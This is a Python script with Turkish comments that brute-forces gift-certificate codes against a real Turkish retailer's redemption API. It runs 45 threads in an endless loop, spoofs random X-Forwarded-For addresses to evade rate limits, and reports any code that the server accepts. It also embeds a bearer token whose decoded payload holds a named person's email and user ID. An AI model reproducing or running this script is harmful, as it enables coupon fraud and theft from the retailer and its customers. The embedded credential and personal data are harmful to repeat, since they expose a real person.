import requests
import json
import random
import threading
import queue
import string
import time

# Rastgele IP üret
def random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

# API Token
token = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3NDY0Nzc4NDIsImV4cCI6MTc0NjczNzM0MiwiaWF0IjoxNzQ2NDc3ODQyLCJVc2VySWQiOiJiMTUyNjJjOS04NmM3LTRkYTQtYTAwOC01OGVhNzU2ZjQzMDUiLCJUaXRsZSI6IkJla2lyIEVyZGVtIiwiRmlyc3ROYW1lIjoiQmVraXIiLCJMYXN0TmFtZSI6IkVyZGVtIiwiRW1haWwiOiJoZXBpMjA3MTBAZ21haWwuY29tIiwiSXNBdXRoZW50aWNhdGVkIjoiVHJ1ZSIsIkFwcEtleSI6IkFGN0YyQTM3LUNDNEItNEYxQy04N0ZELUZGMzY0MkY2N0VDQiIsIlByb3ZpZGVyIjoiSGVwc2lidXJhZGEiLCJTaGFyZURhdGFQZXJtaXNzaW9uIjoiVHJ1ZSIsIlRlbmFudCI6InZvZGFmb25lIiwiSnRpIjoiN2VhYjg3ZWItYmNkZC00YmVkLTlkZDMtMzYwZTFiNjJjN2YwIiwicCI6eyJ0IjpbXX19.DUQ3woQ0eJ2MCh_z3b9t-w8OafiuTkGdJGismd8ZVh0"

# API URL
url = "https://obiwan-gw.hepsiburada.com/api/v1/giftcert/useGiftCert"

# Header üretici
def make_headers():
    return {
        'User-Agent': "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        'Accept': "application/json, text/plain, */*",
        'Accept-Language': "tr-TR,tr;q=0.9",
        'Authorization': token,
        'Origin': "https://checkout.hepsiburada.com",
        'Sec-Fetch-Mode': "cors",
        'Sec-Fetch-Dest': "empty",
        'Referer': "https://checkout.hepsiburada.com/",
        'Sec-Fetch-Site': "same-site",
        'Content-Type': "application/json;charset=utf-8",
        'X-Forwarded-For': random_ip()
    }

# İşlem yapılacak kuponları yöneten fonksiyon
def run_batch(random_code):
    q = queue.Queue()
    for i in range(100):
        for j in range(100):
            q.put(f"HB{i:02d}{random_code}{j:02d}")

    def worker():
        while not q.empty():
            code = q.get()
            payload = {"code": code}
            try:
                headers = make_headers()
                response = requests.post(url, data=json.dumps(payload), headers=headers, timeout=2)
                if response.status_code == 200:
                    print(f"\n\033[92m[+] {code} -> {response.text}\033[0m")
            except:
                pass
            q.task_done()

    threads = []
    for _ in range(45):
        t = threading.Thread(target=worker)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

# Sonsuz döngü
while True:
    random_code = ''.join(random.choices(string.ascii_uppercase, k=4))
    print(f"\n\033[94m[!] Yeni Kod Seti Başladı: {random_code}\033[0m")
    run_batch(random_code)
    time.sleep(1)  # Yeni set arasında kısa gecikme
